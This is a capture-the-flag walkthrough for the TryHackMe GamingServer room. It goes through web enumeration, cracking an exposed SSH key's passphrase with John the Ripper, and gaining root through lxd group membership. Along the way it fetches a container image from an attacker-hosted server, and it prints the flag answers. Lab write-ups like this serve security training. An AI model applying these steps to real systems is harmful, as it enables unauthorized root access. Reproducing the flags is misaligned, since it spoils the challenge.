# GamingServer

Welcome to the GamingServer room walkthrough on TryHackMe!

{% embed url="https://tryhackme.com/room/gamingserver" %}

***

GamingServer is an easy beginner-level boot-to-root Linux challenge. The path involves web enumeration, finding an exposed SSH private key and wordlist, cracking the key passphrase with John the Ripper, and exploiting LXD container group membership for root privilege escalation.

---

## 1. Reconnaissance & Nmap Scan

We begin by scanning the target host with Nmap:

```bash
nmap -sC -sV -oN nmap_gamingserver.txt <TARGET_IP>
```

### Scan Results:
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Only two ports are open:
- **Port 80 (HTTP)**: Web server titled "House of danak"
- **Port 22 (SSH)**: Remote access

---

## 2. Web Reconnaissance & Directory Discovery

Opening `http://<TARGET_IP>/` in the browser loads a gaming community homepage. Inspecting the HTML source code reveals an interesting developer comment:

```html
<!-- john, please add some actual content to the site! bitching about nothing please! -->
```

We now have a confirmed username: **`john`**.

Next, we check `/robots.txt`:
```text
User-agent: *
Disallow: /uploads/
```

We also run `gobuster` to find other directories:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

### Discovered Directories:
- `/uploads/` (Status: 301)
- `/secret/` (Status: 301)

Browsing to `http://<TARGET_IP>/uploads/`, we find a file named `dict.lst` (a wordlist). We download it:
```bash
wget http://<TARGET_IP>/uploads/dict.lst
```

Browsing to `http://<TARGET_IP>/secret/`, we find a file called `secretKey`:
```bash
wget http://<TARGET_IP>/secret/secretKey
```

Inspecting `secretKey`:
```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----
```
It is an encrypted RSA private key.

---

## 3. Cracking the SSH Key Passphrase

We convert `secretKey` to a format John the Ripper can understand using `ssh2john`:

```bash
ssh2john secretKey > key.hash
```

Now we crack the passphrase using the custom `dict.lst` wordlist we downloaded from the server:

```bash
john --wordlist=dict.lst key.hash
```

Output:
```text
letmein          (secretKey)
```

The passphrase is **`letmein`**!

---

## 4. Initial Access & User Flag

We set the proper permissions on the private key and connect via SSH as user `john`:

```bash
chmod 600 secretKey
ssh -i secretKey john@<TARGET_IP>
```
When prompted, we enter the passphrase: `letmein`.

```bash
john@exploitable:~$ whoami
john
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

**User Flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`

---

## 5. Privilege Escalation via LXD Group

Checking the user's groups:

```bash
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

User `john` is a member of the **`lxd`** group. Group membership in `lxd` allows a user to create and control system containers with root privileges, mounting the host filesystem into the container.

### Step-by-Step Exploitation:

1. **On the Attacker Machine:**
   Build an Alpine Linux LXD image using `lxd-alpine-builder`:
   ```bash
   git clone https://github.com/saghul/lxd-alpine-builder.git
   cd lxd-alpine-builder
   sudo ./build-alpine
   ```
   This generates a file such as `alpine-v3.13-x86_64-20210218_0139.tar.gz`.

2. **Transfer to Target:**
   Host the image on the attacking machine:
   ```bash
   python3 -m http.server 8000
   ```
   Download it on the target inside `/tmp`:
   ```bash
   cd /tmp
   wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
   ```

3. **Import and Mount Host Filesystem:**
   ```bash
   lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
   lxc init myimage ignite -c security.privileged=true
   lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
   lxc start ignite
   lxc exec ignite /bin/sh
   ```

4. **Root Shell & Root Flag:**
   Inside the container shell, we have full access to the host's root filesystem mounted at `/mnt/root`:
   ```sh
   ~ # whoami
   root
   ~ # cat /mnt/root/root/root.txt
   2e337b8c9f3aff0c2b3e8d4e6a7c88fc
   ```

**Root Flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

---

## 🏁 Questions & Answers

| Task / Question | Answer |
| :--- | :--- |
| **What is the user flag?** | `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e` |
| **What is the root flag?** | `2e337b8c9f3aff0c2b3e8d4e6a7c88fc` |

***
